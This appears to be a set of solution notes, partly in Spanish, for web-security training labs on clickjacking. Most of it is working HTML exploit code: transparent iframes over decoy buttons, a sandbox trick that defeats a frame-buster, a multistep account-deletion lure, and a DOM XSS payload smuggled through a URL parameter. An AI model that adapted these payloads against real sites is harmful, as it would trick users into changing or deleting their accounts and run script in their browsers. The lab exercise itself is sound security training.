
## Lab: Basic clickjacking with CSRF token protection

Send a web with this code to the victim: 
```html
<head>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 1000px;
            height: 800px;
            opacity: 0.001;
            z-index: 2;
        }
        #decoy {
            position: absolute;
            top: 400;
            left: -170;
            width: 500px;
            height: 300px;
            z-index: 1;
            text-align: center;
            padding-top: 100px;
        }
        button {
        background-color: red;
        width: 180px;
        height: 40px;
}
    </style>
</head>

<body>
    <iframe src="https://0a2f00b904c7c17680e70dd0007e0061.web-security-academy.net/my-account"></iframe>

    <div id="decoy">
        <button>click</button>
    </div>
</body>
```

## Lab: Clickjacking with form input data prefilled from a URL parameter

```
https://0a2e002604af840e807bb299002300c4.web-security-academy.net/my-account?email=final@test.com
```

## Lab: Clickjacking with a frame buster script

La pagina victima tenia que estar arriba para bypassear el frame buster 
```html
<head>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 1000px;
            height: 800px;
            opacity: 0.001;
            z-index: 3;
        }
        #decoy {
            position: absolute;
            top: 350;
            left: -130;
            width: 500px;
            height: 300px;
            z-index: 1;
            text-align: center;
            padding-top: 100px;
        }
        button {
        background-color: red;
        width: 180px;
        height: 40px;
}
    </style>
</head>

<body>
    <iframe src="https://0a8300450495d4809ebdba3b005600bf.web-security-academy.net/my-account?email=final@test.com" sandbox="allow-forms" ></iframe>

    <div id="decoy">
        <button>click</button>
    </div>
</body>
```

## Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

La página tenia un archivo `submitFeedback.js` que provocaba una vulnerabilidad XSS DOM ya que incrustaba el valor del campo `name` que se enviaba a la hora de hacer un feedback: 
```html
<style>
	iframe {
		position:relative;
		width: 1000px;
		height: 1000px;
		opacity: 0.00001;
		z-index: 2;
	}
  #test {
		position:absolute;
        width: 200px;
        height: 40px;
		top: 819;
		left: 0;
		z-index: 0;
	}
</style>
<button id="test">Click me</button>
<iframe
src="https://0aed007504bb17cd831be7ba0061003b.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

## Lab: Multistep clickjacking

Debido a que la página solicitaba confirmación para eliminar el usuario se aplicaron dos señuelos clickeables para seleccionar eliminar y para confirmar la eliminación: 
```html
<html> 
<head> 
<style>
  #ventana1 {
		position:relative;
		width: 1000px;
		height: 1000px;
		opacity: 0.0000001;
		z-index:3;
	}
  #uno {
    position: absolute; 
    background-color: red;
    width: 150px;
    height: 40px;
    top: 500px; 
    left: 20px;
    z-index: 2; 
  }
  #dos{
    position: absolute; 
    background-color: blue;
    width: 150px;
    height: 40px;
    top: 300px; 
    left: 170px;
    z-index: 1; 
  }
</style>
</head>
<body> 

<div id="uno">Click me first</div>
<div id="dos">Click me next</div>

<iframe id="ventana1" src="https://0ac1003804c9eabd80d01c5400ca0079.web-security-academy.net/my-account"></iframe>

</body>
</html>
```

